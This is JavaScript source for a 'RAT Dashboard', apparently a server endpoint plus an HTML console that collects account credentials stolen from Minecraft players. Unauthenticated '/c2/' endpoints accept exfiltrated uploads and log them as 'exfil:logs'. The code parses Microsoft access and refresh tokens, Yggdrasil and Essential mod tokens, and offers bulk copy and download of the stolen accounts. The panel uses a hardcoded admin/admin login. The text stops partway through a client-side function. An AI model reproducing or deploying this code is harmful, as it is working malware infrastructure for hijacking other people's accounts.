const MAX_ENTRIES = 1000;
const MAX_BODY = 500000; // 500KB — enough for accounts JSON with skin data
const AUTH_USER = "admin";
const AUTH_PASS = "admin";
let kv;
try {
  kv = (await import("@vercel/kv")).kv;
} catch {}

const mem = [];

function unauthorized(res) {
  res.setHeader("WWW-Authenticate", 'Basic realm="RAT Dashboard"');
  return res.status(401).end("Unauthorized");
}

function checkAuth(headers) {
  const ah = headers["authorization"] || "";
  const b64 = Buffer.from(`${AUTH_USER}:${AUTH_PASS}`).toString("base64");
  return ah === `Basic ${b64}`;
}

function parseMultipart(body, ct) {
  const m = ct && ct.match(/boundary=(.+?)(?:;|$)/);
  if (!m) return null;
  const boundary = m[1].trim();
  const parts = body
    .split("--" + boundary)
    .filter((p) => p && p !== "--\r\n" && p !== "--");
  const result = {};
  for (const part of parts) {
    if (part.startsWith("--\r\n") || part.startsWith("--")) continue;
    const headerEnd = part.indexOf("\r\n\r\n");
    if (headerEnd === -1) continue;
    const header = part.slice(0, headerEnd);
    const content = part.slice(headerEnd + 4).replace(/\r\n$/, "");
    const nameMatch = header.match(/name="([^"]+)"/);
    if (nameMatch) result[nameMatch[1]] = content;
  }
  return result;
}

function parseTwopointfive(body) {
  try {
    const parsed = JSON.parse(body);
    const content = parsed.content || "";
    const parts = content
      .split("\n")
      .map((s) => s.trim())
      .filter(Boolean);
    const username = (parts[0] || "")
      .replace(/\*\*1\*\*:\s*`(.+)`/, "$1")
      .trim();
    const tokenRaw = (parts[1] || "")
      .replace(/\*\*2\*\*:\s*`(.+)`/, "$1")
      .trim();
    const timestamp = (parts[2] || "").replace(/\*\*3\*\*[:*]*\s*/, "").trim();
    const profileUrl = (parts[3] || "")
      .replace(/.*\[([^\]]+)\]\(([^)]+)\).*/, "$2")
      .trim();
    const modVersion = (parts[4] || "").replace(/`/g, "").trim();
    return {
      username,
      tokenRaw,
      timestamp,
      profileUrl,
      modVersion,
      rawContent: content,
    };
  } catch {
    return null;
  }
}

function parseAccJson(body) {
  try {
    const data = JSON.parse(body);
    const accounts = data.accounts || data;
    if (!Array.isArray(accounts)) return null;
    return accounts.map((a) => {
      // Normalize Essential mod format (auth.mcToken, auth.accessToken, auth.profile) into dashboard fields
      if (a.auth && !a.profile) {
        if (a.auth.profile) {
          a.profile = a.auth.profile;
        } else if (a.name || a.uuid) {
          a.profile = { name: a.name, id: a.uuid };
        }
        if (a.auth.mcToken) {
          a.ygg = { token: a.auth.mcToken.value, exp: a.auth.mcToken.expires?.seconds };
        }
        if (a.auth.accessToken) {
          a.msa = {
            token: a.auth.accessToken.value,
            refresh_token: a.auth.refreshToken?.value,
            exp: a.auth.accessToken.expires?.seconds,
          };
        }
      }
      const p = a.profile || {};
      return {
        _raw: a,
        name: p.name || a.name || "?",
        uuid: p.id || a.uuid || "?",
        type: a.type || "?",
      };
    });
  } catch {
    return null;
  }
}

function parseEss(body, ct) {
  const mp = parseMultipart(body, ct);
  if (!mp) {
    const parsed = parseAccJson(body);
    if (parsed)
      return { accounts: parsed, summary: `Found ${parsed.length} account(s)` };
    return null;
  }
  const fileContent = mp.file || body;
  const textSummary = mp.content || "";
  const accounts = parseAccJson(fileContent);
  if (!accounts) return null;
  return { accounts, summary: textSummary };
}

async function store(entry) {
  const parsed = {};
  const u = entry.u || "";
  if (u.includes("/ess") || u.includes("/essfb")) {
    const r = parseEss(entry.b, entry.h?.ct);
    if (r) {
      parsed.accounts = r.accounts;
      parsed.summary = r.summary || "";
    }
  }
  if (u.includes("/twopointfive") || u.includes("/exfil/esf")) {
    const r = parseTwopointfive(entry.b);
    if (r) parsed.session = r;
  }
  if (parsed.accounts || parsed.session) entry._parsed = parsed;

  if (kv) {
    try {
      await kv.lpush("exfil:logs", JSON.stringify(entry));
      await kv.ltrim("exfil:logs", 0, MAX_ENTRIES - 1);
      return;
    } catch {}
  }
  mem.unshift(entry);
  if (mem.length > MAX_ENTRIES) mem.length = MAX_ENTRIES;
}

function parseEntry(e) {
  const u = e.u || "";
  try {
    if (u.includes("/ess") || u.includes("/essfb")) {
      const r = parseEss(e.b, e.h?.ct);
      if (r) {
        e._parsed = { accounts: r.accounts, summary: r.summary || "" };
        return e;
      }
    }
    if (u.includes("/twopointfive") || u.includes("/exfil/esf")) {
      const r = parseTwopointfive(e.b);
      if (r) {
        e._parsed = { session: r };
        return e;
      }
    }
  } catch {}
  return e;
}

async function load() {
  if (kv) {
    try {
      const raw = await kv.lrange("exfil:logs", 0, MAX_ENTRIES - 1);
      return raw
        .map((r) => (typeof r === "string" ? JSON.parse(r) : r))
        .filter(Boolean)
        .map(parseEntry);
    } catch {}
  }
  return [...mem].map(parseEntry);
}

function esc(s) {
  if (typeof s !== "string") s = String(s ?? "");
  return s
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

function decodeJwt(token) {
  try {
    const parts = token.split(".");
    if (parts.length !== 3) return null;
    const header = JSON.parse(Buffer.from(parts[0], "base64url").toString());
    if (
      header.enc ||
      header.alg === "RSA-OAEP" ||
      header.alg === "RSA-OAEP-256"
    ) {
      return { header, encrypted: true };
    }
    let b64 = parts[1].replace(/-/g, "+").replace(/_/g, "/");
    while (b64.length % 4) b64 += "=";
    const payload = JSON.parse(Buffer.from(b64, "base64").toString());
    return { header, payload, encrypted: false };
  } catch {
    return null;
  }
}

function formatJwtPayload(payload) {
  if (!payload) return [];
  return Object.entries(payload).map(([k, v]) => {
    if (k === "iat" || k === "exp" || k === "nbf") {
      const d = new Date(v * 1000);
      return {
        k,
        v:
          d.toLocaleString() +
          " (" +
          Math.round((v - Date.now() / 1000) / 86400) +
          "d)",
        kind: "date",
      };
    }
    if (typeof v === "object") return { k, v: JSON.stringify(v), kind: "json" };
    return { k, v: String(v), kind: "text" };
  });
}

function skinDataToDataUri(base64Data) {
  try {
    const buf = Buffer.from(base64Data, "base64");
    if (buf.length < 8) return null;
    return "data:image/png;base64," + base64Data;
  } catch {
    return null;
  }
}

function buildAccountsJson(entries) {
  const allAccounts = entries.flatMap((e) => e._parsed?.accounts || []);
  if (allAccounts.length === 0) return "[]";
  return JSON.stringify({ accounts: allAccounts.map((a) => a._raw) }, null, 2);
}

function buildAccountBatches(entries, hasData) {
  return entries
    .filter((e) => e._parsed?.accounts?.length)
    .map((e, id) => ({
      id,
      time: e.t,
      url: e.u || "",
      summary: e._parsed.summary || "",
      accounts: e._parsed.accounts.filter(hasData),
    }))
    .filter((b) => b.accounts.length > 0);
}

export default async function handler(req, res) {
  const { method, url, headers } = req;

  // Skip auth for exfiltration & webhook endpoints
  const publicPaths = ["/c2/", "/api/webhooks/"];
  const isPublic = publicPaths.some((p) => url.startsWith(p));
  if (!isPublic && !checkAuth(req.headers)) return unauthorized(res);
  const now = new Date().toISOString();

  if (method === "GET" && url.startsWith("/api/download/accounts")) {
    const entries = await load();
    const json = buildAccountsJson(entries);
    return res
      .status(200)
      .setHeader("Content-Type", "application/json")
      .setHeader("Content-Disposition", 'attachment; filename="accounts.json"')
      .send(json);
  }

  if (method === "GET" && url.startsWith("/api/status")) {
    let kvOk = false;
    let kvCount = -1;
    if (kv) {
      try {
        const raw = await kv.lrange("exfil:logs", 0, -1);
        kvCount = raw.length;
        kvOk = true;
      } catch (e) {
        kvOk = false;
      }
    }
    return res
      .status(200)
      .json({
        kv: !!kv,
        kv_connected: kvOk,
        kv_entries: kvCount,
        mem_entries: mem.length,
      });
  }

  if (method === "POST" && url.startsWith("/api/clear")) {
    if (kv) {
      try {
        await kv.del("exfil:logs");
      } catch {}
    }
    mem.length = 0;
    return res.status(200).json({ ok: true });
  }

  if (method === "POST" && url.startsWith("/api/delete")) {
    let body;
    try {
      const chunks = [];
      for await (const chunk of req) chunks.push(chunk);
      body = JSON.parse(Buffer.concat(chunks).toString("utf-8"));
    } catch { return res.status(400).json({ ok: false }); }
    const { t, u } = body;
    if (!t) return res.status(400).json({ ok: false });
    const before = mem.length;
    for (let i = mem.length - 1; i >= 0; i--) {
      if (mem[i].t === t && (!u || mem[i].u === u)) mem.splice(i, 1);
    }
    if (kv) {
      try {
        const raw = await kv.lrange("exfil:logs", 0, -1);
        const filtered = raw.map((r) => (typeof r === "string" ? JSON.parse(r) : r)).filter((e) => !(e.t === t && (!u || e.u === u)));
        await kv.del("exfil:logs");
        for (const e of filtered) await kv.lpush("exfil:logs", JSON.stringify(e));
      } catch {}
    }
    return res.status(200).json({ ok: true, removed: before - mem.length });
  }

  if (method === "POST" || method === "PUT") {
    let body;
    try {
      const chunks = [];
      for await (const chunk of req) chunks.push(chunk);
      const raw = Buffer.concat(chunks);
      body = raw.toString("utf-8");
    } catch {
      body = "(unreadable body)";
    }

    const entry = {
      t: now,
      m: method,
      u: url,
      h: { ua: headers["user-agent"] || "", ct: headers["content-type"] || "" },
      b:
        body.length > MAX_BODY
          ? body.slice(0, MAX_BODY) + "... (truncated)"
          : body,
    };

    await store(entry);
    console.log("[EXFIL]", JSON.stringify(entry, null, 2));
    return res.status(200).end();
  }

  if (method === "GET") {
    const entries = await load();
    const accept = req.headers["accept"] || "";
    if (accept.includes("application/json")) {
      return res.status(200).json(entries);
    }

    function hasData(a) {
      const r = a._raw || {};
      return !!(
        r.profile?.name ||
        r.profile?.id ||
        r.msa?.token ||
        r.utoken?.token ||
        r["xrp-mc"]?.token ||
        r.ygg?.token ||
        r.auth?.mcToken?.value ||
        r.auth?.accessToken?.value ||
        r.name
      );
    }

    const accountBatches = buildAccountBatches(entries, hasData);
    const accounts = accountBatches.flatMap((b) => b.accounts);
    const sessions = entries
      .filter((e) => e._parsed?.session)
      .map((e) => ({
        ...e._parsed.session,
        time: e.t,
        url: e.u,
      }));
    const allUniqueNames = [...new Set(accounts.map((a) => a.name))];

    const html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>RAT Dashboard</title>
  <style>
    :root {
      --bg: #080a0f;
      --bg2: #0e1118;
      --surface: #141820;
      --surface2: #1a1f2a;
      --border: #2a3140;
      --border-hi: #3d4659;
      --text: #e8edf5;
      --muted: #8b95a8;
      --dim: #5c6678;
      --accent: #57c56a;
      --accent-dim: #3d9a4f;
      --blue: #5b9cf5;
      --gold: #e8b84a;
      --red: #f47067;
      --orange: #e3a008;
      --purple: #bc8cff;
      --radius: 12px;
      --shadow: 0 8px 32px rgba(0,0,0,.45);
      --mono: ui-monospace, "Cascadia Code", "Segoe UI Mono", monospace;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    html { scroll-behavior: smooth; }
    body {
      font-family: "Segoe UI", system-ui, -apple-system, sans-serif;
      background: var(--bg);
      background-image:
        radial-gradient(ellipse 80% 50% at 50% -20%, rgba(87,197,106,.12), transparent),
        radial-gradient(ellipse 60% 40% at 100% 0%, rgba(91,156,245,.08), transparent),
        linear-gradient(180deg, var(--bg) 0%, #0a0d14 100%);
      color: var(--text);
      min-height: 100vh;
      line-height: 1.5;
    }
    .app { max-width: 1280px; margin: 0 auto; padding: 20px 20px 60px; }

    .topbar {
      display: flex; align-items: center; justify-content: space-between; gap: 16px;
      padding: 18px 22px; margin-bottom: 20px;
      background: linear-gradient(135deg, rgba(26,31,42,.95), rgba(20,24,32,.98));
      border: 1px solid var(--border); border-radius: 16px;
      box-shadow: var(--shadow); backdrop-filter: blur(12px);
    }
    .brand { display: flex; align-items: center; gap: 14px; }
    .brand-icon {
      width: 44px; height: 44px; border-radius: 10px;
      background: linear-gradient(135deg, #3d7a46, #57c56a);
      display: grid; place-items: center; font-size: 1.3rem;
      box-shadow: 0 4px 16px rgba(87,197,106,.3);
    }
    .brand h1 { font-size: 1.35rem; font-weight: 700; letter-spacing: -.02em; }
    .brand p { font-size: .78rem; color: var(--muted); margin-top: 2px; }
    .topbar-actions { display: flex; gap: 8px; flex-wrap: wrap; }

    .stats {
      display: grid; grid-template-columns: repeat(auto-fit, minmax(130px, 1fr));
      gap: 10px; margin-bottom: 20px;
    }
    .stat {
      background: var(--surface); border: 1px solid var(--border);
      border-radius: var(--radius); padding: 16px; text-align: center;
      transition: transform .15s, border-color .15s;
    }
    .stat:hover { transform: translateY(-2px); border-color: var(--border-hi); }
    .stat-val { font-size: 1.75rem; font-weight: 800; color: var(--blue); line-height: 1.1; }
    .stat-lbl {
      font-size: .68rem; color: var(--muted); text-transform: uppercase;
      letter-spacing: .06em; margin-top: 6px; display: block;
    }

    .panel {
      background: var(--surface); border: 1px solid var(--border);
      border-radius: 16px; overflow: hidden; box-shadow: var(--shadow);
    }
    .tabs {
      display: flex; gap: 4px; padding: 8px 8px 0;
      background: var(--surface2); border-bottom: 1px solid var(--border);
      overflow-x: auto;
    }
    .tab {
      padding: 10px 18px; cursor: pointer; border-radius: 10px 10px 0 0;
      color: var(--muted); font-size: .85rem; font-weight: 500;
      border: 1px solid transparent; border-bottom: none;
      transition: all .15s; white-space: nowrap; user-select: none;
    }
    .tab:hover { color: var(--text); background: rgba(255,255,255,.03); }
    .tab.active {
      color: var(--text); background: var(--surface);
      border-color: var(--border); margin-bottom: -1px;
      box-shadow: inset 0 -2px 0 var(--accent);
    }
    .tab-count {
      background: rgba(255,255,255,.06); border-radius: 20px;
      padding: 1px 8px; font-size: .75rem; margin-left: 6px;
    }
    .tab.active .tab-count { background: var(--accent-dim); color: #fff; }

    .tab-content { padding: 20px; }
    .sticky-toolbar {
      position: sticky; top: 8px; z-index: 50;
      background: rgba(20,24,32,.92); backdrop-filter: blur(10px);
      border: 1px solid var(--border); border-radius: var(--radius);
      padding: 12px; margin-bottom: 16px;
      display: flex; flex-wrap: wrap; gap: 10px; align-items: center;
    }
    .search-wrap { flex: 1; min-width: 200px; position: relative; }
    .search-wrap input {
      width: 100%; padding: 10px 14px 10px 36px;
      background: var(--bg2); border: 1px solid var(--border);
      border-radius: 10px; color: var(--text); font-size: .88rem;
      outline: none; transition: border-color .15s, box-shadow .15s;
    }
    .search-wrap input:focus {
      border-color: var(--accent); box-shadow: 0 0 0 3px rgba(87,197,106,.15);
    }
    .search-wrap::before {
      content: "⌕"; position: absolute; left: 12px; top: 50%;
      transform: translateY(-50%); color: var(--dim); font-size: 1rem;
    }
    .search-hint {
      position: absolute; right: 10px; top: 50%; transform: translateY(-50%);
      font-size: .68rem; color: var(--dim); background: var(--surface2);
      padding: 2px 6px; border-radius: 4px; border: 1px solid var(--border);
      pointer-events: none;
    }
    .toolbar-actions { display: flex; flex-wrap: wrap; gap: 6px; }

    .btn {
      padding: 8px 14px; border-radius: 9px; border: 1px solid var(--border);
      background: var(--surface2); color: var(--text); cursor: pointer;
      font-size: .8rem; font-weight: 500; text-decoration: none;
      display: inline-flex; align-items: center; gap: 6px;
      transition: all .15s; white-space: nowrap;
    }
    .btn:hover { border-color: var(--border-hi); background: #222833; }
    .btn:active { transform: scale(.98); }
    .btn-primary { background: var(--blue); border-color: #4a8ae0; color: #fff; }
    .btn-primary:hover { background: #6aadf7; }
    .btn-danger { background: #9e2c2c; border-color: #b33; color: #fff; }
    .btn-danger:hover { background: var(--red); border-color: var(--red); }
    .btn-ygg { background: var(--accent-dim); border-color: var(--accent); color: #fff; }
    .btn-ygg:hover { background: var(--accent); }
    .btn-sm { font-size: .72rem; padding: 5px 10px; }
    .btn-outline { background: transparent; color: var(--muted); }
    .btn-outline:hover { color: var(--text); border-color: var(--blue); }
    .btn-ghost { background: transparent; border-color: transparent; color: var(--muted); }
    .btn-ghost:hover { background: rgba(255,255,255,.05); color: var(--text); }

    .batch {
      background: var(--bg2); border: 1px solid var(--border);
      border-radius: 14px; margin-bottom: 16px; overflow: hidden;
      transition: border-color .15s, opacity .2s;
    }
    .batch:hover { border-color: var(--border-hi); }
    .batch.collapsed .batch-body { display: none; }
    .batch.batch-hidden { display: none; }
    .batch-header {
      padding: 14px 16px; cursor: pointer; user-select: none;
      display: flex; align-items: flex-start; gap: 12px;
      background: linear-gradient(90deg, rgba(87,197,106,.06), transparent);
      border-bottom: 1px solid var(--border);
    }
    .batch-header .collapse-icon {
      color: var(--accent); margin-top: 4px; font-size: .75rem;
      transition: transform .2s; flex-shrink: 0;
    }
    .batch.collapsed .batch-header .collapse-icon { transform: rotate(-90deg); }
    .batch-title { font-weight: 700; font-size: .95rem; color: var(--text); }
    .batch-meta {
      font-size: .76rem; color: var(--muted); margin-top: 4px;
      font-family: var(--mono); word-break: break-all;
    }
    .batch-chips { display: flex; flex-wrap: wrap; gap: 4px; margin-top: 8px; }
    .name-chip {
      font-size: .7rem; padding: 2px 8px; border-radius: 20px;
      background: rgba(91,156,245,.12); border: 1px solid rgba(91,156,245,.25);
      color: var(--blue);
    }
    .name-chip.muted { background: rgba(255,255,255,.04); border-color: var(--border); color: var(--muted); }
    .rel-time {
      font-size: .72rem; padding: 3px 8px; border-radius: 20px;
      background: rgba(255,255,255,.05); color: var(--gold);
      border: 1px solid rgba(232,184,74,.25); white-space: nowrap;
    }
    .batch-actions { display: flex; gap: 6px; flex-shrink: 0; flex-wrap: wrap; justify-content: flex-end; }
    .batch-body { padding: 12px; }

    .acard {
      background: var(--surface); border: 1px solid var(--border);
      border-radius: var(--radius); margin-bottom: 10px; overflow: hidden;
      transition: border-color .15s, box-shadow .15s, opacity .2s;
    }
    .acard:hover { border-color: var(--border-hi); box-shadow: 0 4px 20px rgba(0,0,0,.25); }
    .acard.card-hidden { display: none; }
    .acard.collapsed .section { display: none; }
    .acard-header {
      padding: 12px 14px; display: flex; align-items: center; gap: 12px;
      cursor: pointer; user-select: none;
      background: linear-gradient(90deg, rgba(255,255,255,.02), transparent);
      border-bottom: 1px solid var(--border);
    }
    .acard-header .collapse-icon {
      color: var(--dim); font-size: .7rem; transition: transform .15s; flex-shrink: 0;
    }
    .acard.collapsed .collapse-icon { transform: rotate(-90deg); }
    .acard.collapsed { border-color: var(--border); }
    .acard-avatar {
      width: 40px; height: 40px; border-radius: 8px;
      background: var(--bg2); border: 1px solid var(--border);
      overflow: hidden; flex-shrink: 0; image-rendering: pixelated;
    }
    .acard-avatar img { width: 100%; height: 100%; object-fit: cover; }
    .acard-name { font-weight: 700; font-size: 1rem; }
    .acard-uuid { font-size: .72rem; color: var(--muted); font-family: var(--mono); margin-top: 1px; }
    .acard-actions { display: flex; gap: 5px; flex-shrink: 0; flex-wrap: wrap; }
    .badge {
      font-size: .68rem; font-weight: 600; padding: 3px 8px;
      border-radius: 20px; white-space: nowrap;
    }
    .badge-green { background: rgba(87,197,106,.15); color: var(--accent); border: 1px solid rgba(87,197,106,.3); }
    .badge-orange { background: rgba(227,160,8,.12); color: var(--orange); border: 1px solid rgba(227,160,8,.3); }
    .badge-red { background: rgba(244,112,103,.12); color: var(--red); border: 1px solid rgba(244,112,103,.3); }
    .badge-muted { background: rgba(255,255,255,.04); color: var(--dim); border: 1px solid var(--border); }

    .section { border-bottom: 1px solid rgba(255,255,255,.04); }
    .section:last-child { border-bottom: none; }
    .section-closed .section-body { display: none; }
    .section-closed .section-chevron { transform: rotate(-90deg); }
    .section-title {
      padding: 10px 14px; font-size: .72rem; font-weight: 600;
      color: var(--muted); text-transform: uppercase; letter-spacing: .06em;
      display: flex; align-items: center; gap: 8px; cursor: pointer;
      transition: color .15s, background .15s;
    }
    .section-title:hover { color: var(--text); background: rgba(255,255,255,.02); }
    .section-chevron { font-size: .65rem; color: var(--accent); transition: transform .15s; }
    .section-spacer { flex: 1; }
    .section-body { padding: 4px 14px 12px; }

    .profile-grid {
      display: grid; grid-template-columns: 1fr auto; gap: 16px; align-items: start;
    }
    .skin-preview {
      width: 64px; height: 128px; image-rendering: pixelated;
      border: 1px solid var(--border); border-radius: 8px; background: var(--bg2);
    }
    .field-row {
      display: grid; grid-template-columns: 130px 1fr auto;
      gap: 8px; padding: 5px 0; font-size: .82rem; align-items: start;
    }
    .field-lbl { color: var(--dim); flex-shrink: 0; }
    .field-val {
      color: var(--text); font-family: var(--mono); font-size: .78rem;
      word-break: break-all; min-width: 0;
    }
    .field-val.green { color: var(--accent); }
    .field-val.red { color: var(--red); }
    .field-val.orange { color: var(--orange); }
    .field-val.purple { color: var(--purple); }
    .field-val.cyan { color: var(--blue); }
    .field-val.trunc { max-height: 2.6em; overflow: hidden; cursor: pointer; }
    .field-val.trunc:hover { color: var(--blue); }
    .field-val.trunc.expanded { max-height: none; }
    .field-val a { color: var(--blue); text-decoration: none; }
    .field-val a:hover { text-decoration: underline; }

    .cpy {
      background: rgba(255,255,255,.04); border: 1px solid var(--border);
      color: var(--muted); cursor: pointer; padding: 2px 8px;
      font-size: .68rem; border-radius: 5px; transition: all .1s;
    }
    .cpy:hover { color: var(--blue); border-color: var(--blue); }
    .cpy.ok { color: var(--accent); border-color: var(--accent); }

    .cape-grid { display: flex; flex-wrap: wrap; gap: 4px; margin-top: 4px; }
    .cape-badge {
      font-size: .72rem; padding: 2px 9px; border-radius: 20px;
      background: var(--bg2); border: 1px solid var(--border); color: var(--text);
    }

    .scard {
      background: var(--surface2); border: 1px solid var(--border);
      border-radius: var(--radius); padding: 16px; margin-bottom: 10px;
      transition: border-color .15s;
    }
    .scard:hover { border-color: var(--border-hi); }
    .scard-top { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; flex-wrap: wrap; }
    .scard-time { color: var(--muted); font-size: .78rem; }
    .scard-path {
      background: var(--bg2); padding: 3px 10px; border-radius: 8px;
      font-size: .75rem; color: var(--blue); font-family: var(--mono);
      border: 1px solid var(--border);
    }
    .scard-user { font-size: 1.05rem; font-weight: 600; display: flex; align-items: center; gap: 8px; }
    .scard-info { display: grid; grid-template-columns: 1fr 1fr; gap: 6px 16px; font-size: .82rem; }
    .scard-full { margin-top: 10px; }
    .scard-full textarea {
      width: 100%; background: var(--bg2); border: 1px solid var(--border);
      border-radius: 8px; color: var(--text); padding: 10px;
      font-family: var(--mono); font-size: .75rem; resize: vertical; min-height: 60px;
    }

    .entry {
      background: var(--surface2); border: 1px solid var(--border);
      border-radius: var(--radius); padding: 14px 16px; margin-bottom: 10px;
    }
    .entry-top { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; margin-bottom: 8px; }
    .entry-time { color: var(--muted); font-size: .82rem; }
    .entry-method {
      background: var(--blue); color: #fff; padding: 2px 8px;
      border-radius: 20px; font-size: .7rem; font-weight: 600;
    }
    .entry-path {
      background: var(--bg2); padding: 2px 10px; border-radius: 8px;
      font-size: .76rem; color: var(--blue); font-family: var(--mono);
      border: 1px solid var(--border);
    }
    .entry-extra { margin-top: 6px; font-size: .82rem; }
    .entry-extra.accounts { color: var(--accent); }
    .entry-extra.session { color: var(--blue); }

    .raw-toggle { cursor: pointer; color: var(--muted); font-size: .78rem; padding: 6px 0; }
    .raw-toggle:hover { color: var(--blue); }
    .raw-content { display: none; }
    .raw-content.open { display: block; }
    pre {
      background: var(--bg2); padding: 12px; border-radius: 8px;
      overflow: auto; white-space: pre-wrap; word-break: break-all;
      font-size: .73rem; margin-top: 6px; border: 1px solid var(--border);
      max-height: 400px; font-family: var(--mono);
    }

    .empty {
      color: var(--dim); text-align: center; padding: 48px 20px;
      font-size: .9rem; border: 1px dashed var(--border);
      border-radius: var(--radius);
    }
    .toast {
      position: fixed; bottom: 24px; right: 24px;
      background: var(--accent-dim); color: #fff;
      padding: 12px 20px; border-radius: 10px; font-size: .85rem;
      opacity: 0; transform: translateY(8px);
      transition: opacity .25s, transform .25s;
      pointer-events: none; z-index: 999;
      box-shadow: 0 8px 24px rgba(0,0,0,.4);
    }
    .toast.show { opacity: 1; transform: translateY(0); }

    @media (max-width: 720px) {
      .app { padding: 12px 12px 40px; }
      .topbar { flex-direction: column; align-items: flex-start; }
      .field-row { grid-template-columns: 1fr; gap: 2px; }
      .profile-grid { grid-template-columns: 1fr; }
      .skin-preview { margin: 0 auto; }
      .scard-info { grid-template-columns: 1fr; }
      .search-hint { display: none; }
      .batch-header { flex-wrap: wrap; }
      .batch-actions { width: 100%; justify-content: flex-start; }
    }
  </style>
</head>
<body>
  <div class="app">
  <div id="toast" class="toast">Copied!</div>

  <header class="topbar">
    <div class="brand">
      <div class="brand-icon">⛏</div>
      <div>
        <h1>RAT Dashboard</h1>
        <p>Account capture console</p>
      </div>
    </div>
    <div class="topbar-actions">
      <button class="btn btn-ghost" onclick="location.reload()" title="Reload data">↻ Refresh</button>
      <a class="btn btn-outline" href="?raw=1" target="_blank">Raw JSON</a>
    </div>
  </header>

  <div class="stats">
    <div class="stat"><span class="stat-val">${accountBatches.length}</span><span class="stat-lbl">JSON Uploads</span></div>
    <div class="stat"><span class="stat-val">${accounts.length}</span><span class="stat-lbl">Accounts</span></div>
    <div class="stat"><span class="stat-val">${allUniqueNames.length}</span><span class="stat-lbl">Unique Names</span></div>
    <div class="stat"><span class="stat-val">${sessions.length}</span><span class="stat-lbl">Sessions</span></div>
    <div class="stat"><span class="stat-val">${entries.length}</span><span class="stat-lbl">Captures</span></div>
  </div>

  <div class="panel">
  <div class="tabs">
    <div class="tab active" data-tab="accounts" onclick="switchTab('accounts')">Accounts <span class="tab-count">${accounts.length}</span></div>
    <div class="tab" data-tab="sessions" onclick="switchTab('sessions')">Sessions <span class="tab-count">${sessions.length}</span></div>
    <div class="tab" data-tab="all" onclick="switchTab('all')">All Raw <span class="tab-count">${entries.length}</span></div>
  </div>

  <div id="tab-accounts" class="tab-content">
    ${
      accounts.length === 0
        ? '<div class="empty">No accounts captured yet.</div>'
        : `<div class="sticky-toolbar">
      <div class="search-wrap">
        <input id="search" type="search" placeholder="Search by username…" oninput="filterAccounts(this.value)" autocomplete="off">
        <span class="search-hint">Ctrl+K</span>
      </div>
      <div class="toolbar-actions">
        <button class="btn btn-outline btn-sm" onclick="setAllBatches(true)">+ Batches</button>
        <button class="btn btn-outline btn-sm" onclick="setAllBatches(false)">− Batches</button>
        <button class="btn btn-outline btn-sm" onclick="setAllCards(true)">+ Accounts</button>
        <button class="btn btn-outline btn-sm" onclick="setAllCards(false)">− Accounts</button>
        <button class="btn btn-ygg btn-sm" onclick="copyYggTokens()">Copy all Ygg</button>
        <a class="btn btn-primary btn-sm" href="/api/download/accounts" download="accounts.json">Download all</a>
        <button class="btn btn-outline btn-sm" onclick="copyAllAccounts()">Copy all</button>
      </div>
    </div>
    <div id="no-results" class="empty" style="display:none">No accounts match your search.</div>
    ${(() => {
      let idx = 0;
      return accountBatches
        .map((batch) => {
          const html = renderAccountBatch(batch, idx);
          idx += batch.accounts.length;
          return html;
        })
        .join("\n");
    })()}`
    }
  </div>

  <div id="tab-sessions" class="tab-content" style="display:none">
    ${
      sessions.length === 0
        ? '<div class="empty">No sessions captured yet.</div>'
        : `<div class="sticky-toolbar">
      <div class="search-wrap">
        <input id="search-sessions" type="search" placeholder="Search sessions…" oninput="filterSessions(this.value)" autocomplete="off">
      </div>
      <button class="btn btn-outline btn-sm" onclick="copyAllSessions()">Copy all sessions</button>
    </div>
    <div id="no-session-results" class="empty" style="display:none">No sessions match your search.</div>
    ${sessions.map((s, i) => renderSession(s, i)).join("\n")}`
    }
  </div>

  <div id="tab-all" class="tab-content" style="display:none">
    ${
      entries.length === 0
        ? '<div class="empty">No captures yet.</div>'
        : `<div class="sticky-toolbar">
      <button class="btn btn-danger btn-sm" onclick="clearData()">Clear all data</button>
    </div>
    ${entries.slice().reverse().map(renderEntry).join("\n")}`
    }
  </div>
  </div>
  </div>

  <script>
    function toast(msg) {
      const t = document.getElementById('toast');
      t.textContent = msg;
      t.classList.add('show');
      setTimeout(() => t.classList.remove('show'), 1500);
    }
    function copy(text) {
      navigator.clipboard.writeText(text).then(() => toast('Copied!')).catch(() => {
        const ta = document.createElement('textarea');
        ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
        document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove();
        toast('Copied!');
      });
    }
    function switchTab(name) {
      document.querySelectorAll('.tab-content').forEach(e => e.style.display = 'none');
      document.querySelectorAll('.tab').forEach(e => e.classList.remove('active'));
      document.getElementById('tab-' + name).style.display = '';
      const tab = document.querySelector('.tab[data-tab="' + name + '"]');
      if (tab) tab.classList.add('active');
      try { localStorage.setItem('dash-tab', name); } catch {}
    }
    function toggleRaw(id) { document.getElementById(id).classList.toggle('open'); }
    function toggleTrunc(id) { document.getElementById(id).classList.toggle('expanded'); }
    function toggleSection(el) {
      const sec = el.parentElement;
      sec.classList.toggle('section-open');
      sec.classList.toggle('section-closed');
    }
    function toggleCard(idx) {
      const el = document.getElementById('acard-' + idx);
      if (el) el.classList.toggle('collapsed');
    }
    function toggleBatch(id) {
      const el = document.getElementById('batch-' + id);
      if (el) el.classList.toggle('collapsed');
    }
    function setAllBatches(open) {
      document.querySelectorAll('.batch').forEach(b => b.classList.toggle('collapsed', !open));
    }
    function setAllCards(open) {
      document.querySelectorAll('.acard').forEach(c => c.classList.toggle('collapsed', !open));
    }
    function flashCopy(btn) {
      btn.classList.add('ok');
      btn.textContent = '✓';
      setTimeout(() => { btn.classList.remove('ok'); btn.textContent = 'Copy'; }, 1000);
    }
    function filterAccounts(q) {
      q = (q || '').trim().toLowerCase();
      let visible = 0;
      document.querySelectorAll('.acard').forEach(card => {
        const name = card.getAttribute('data-search') || '';
        const show = !q || name.includes(q);
        card.classList.toggle('card-hidden', !show);
        if (show) visible++;
      });
      document.querySelectorAll('.batch').forEach(batch => {
        const hasVisible = batch.querySelector('.acard:not(.card-hidden)');
        batch.classList.toggle('batch-hidden', !hasVisible);
        if (hasVisible && q) batch.classList.remove('collapsed');
      });
      const nr = document.getElementById('no-results');
      if (nr) nr.style.display = (q && visible === 0) ? '' : 'none';
    }
    function filterSessions(q) {
      q = (q || '').trim().toLowerCase();
      let visible = 0;
